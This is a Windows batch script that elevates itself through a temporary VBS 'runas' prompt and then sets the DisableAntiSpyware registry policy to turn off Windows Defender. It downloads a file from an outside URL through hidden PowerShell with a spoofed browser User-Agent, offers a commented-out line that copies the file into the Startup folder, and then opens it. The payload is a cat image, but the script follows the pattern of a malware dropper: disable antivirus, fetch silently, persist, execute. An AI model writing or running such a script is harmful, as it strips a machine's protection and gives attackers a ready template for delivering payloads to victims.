@echo off
:: Check if the script is run as administrator
NET SESSION >nul 2>&1
if %errorLevel% neq 0 (
    echo Requesting administrative privileges...
    goto UACPrompt
) else (
    echo Running with administrative privileges.
    goto :RunScript
)

:UACPrompt
echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
echo UAC.ShellExecute "cmd.exe", "/c ""%~s0""", "", "runas", 1 >> "%temp%\getadmin.vbs"

"%temp%\getadmin.vbs"
del "%temp%\getadmin.vbs"
goto :eof

:RunScript
:: Your batch script commands go here
SET KEY=HKLM\SOFTWARE\Policies\Microsoft\Windows Defender
SET VALUE=DisableAntiSpyware
SET DATA=1
SET TYPE=REG_DWORD
REG ADD "%KEY%" /v "%VALUE%" /t "%TYPE%" /d "%DATA%" /f

:: Download image using PowerShell
powershell -WindowStyle Hidden -Command "$client = New-Object System.Net.WebClient; $client.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'); $client.DownloadFile('https://upload.wikimedia.org/wikipedia/commons/3/38/Adorable-animal-cat-20787.jpg', 'C:\Adorable-animal-cat-20787.jpg');"

:: Uncomment the following line if you still want to copy the file to the Startup folder
:: xcopy C:\Adorable-animal-cat-20787.jpg "C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" /Y

:: Open the downloaded image
start C:\Adorable-animal-cat-20787.jpg

:: Automatically press Enter
echo. | set /p =Press Enter to exit...

goto :eof
